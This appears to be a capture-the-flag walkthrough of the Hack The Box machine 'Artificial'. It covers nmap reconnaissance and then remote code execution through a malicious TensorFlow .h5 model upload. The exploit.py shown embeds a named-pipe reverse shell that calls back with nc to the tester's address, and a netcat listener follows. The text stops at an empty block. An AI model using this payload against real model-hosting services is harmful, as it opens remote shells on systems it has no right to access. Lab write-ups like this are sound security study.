# Title : Artificial

## Recon

### Port Scanning

```bash

 nmap -sV -sC -Pn -A 10.10.11.74 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-02 20:50 WAT
Nmap scan report for 10.10.11.74
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   147.47 ms 10.10.14.1
2   124.80 ms 10.10.11.74

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.15 seconds
                                                        

```

- add you ip add to /etc/hosts

```bash

$ sudo echo "10.10.11.74    artificial.htb"  >> /etc/hosts

```

- after adding that to the `/etc/hosts`

- proceed to access it on the web browser, where i saw an endpoint to register (which i did), then login with my credential which i use to  regester

- After successfully login, we  see a prompt, where we can see there a Upload Model button, we also see there give so `requirement.txt` and `Dockerfile` which i downloaded and read the infomation in the files


```bash

$ cat requirements.txt 
tensorflow-cpu==2.13.1

$  cat Dockerfile 
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]


```

- i search for how to get a RCE with `.h5` which i was ale to get `https://github.com/Splinter0/tensorflow-rce`
- i modified the exploit.py to my tun interface ip address 

```bash
cat exploit.py 
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.65 4444 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")


```

- i start my listner on port `4444`

```bash

$ nc -lvnp 4444  

```

- bam i have the shell

```bash

```